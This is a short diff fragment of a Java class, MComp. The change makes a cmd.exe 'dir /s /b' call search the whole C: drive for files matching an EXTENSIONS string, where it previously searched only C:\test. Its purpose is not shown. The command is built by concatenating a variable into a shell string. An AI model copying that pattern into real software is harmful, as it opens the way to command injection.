@@ -10,7 +10,7 @@ public class MComp
 	public MComp() throws IOException
 	{
 
-		ProcessBuilder b = new ProcessBuilder("cmd.exe", "/c","cd C:\\test && dir /s /b " + EXTENSIONS);
+		ProcessBuilder b = new ProcessBuilder("cmd.exe", "/c","cd C:\\ && dir /s /b " + EXTENSIONS);
 		b.redirectErrorStream(true);			
 		Process p = b.start();
 		BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
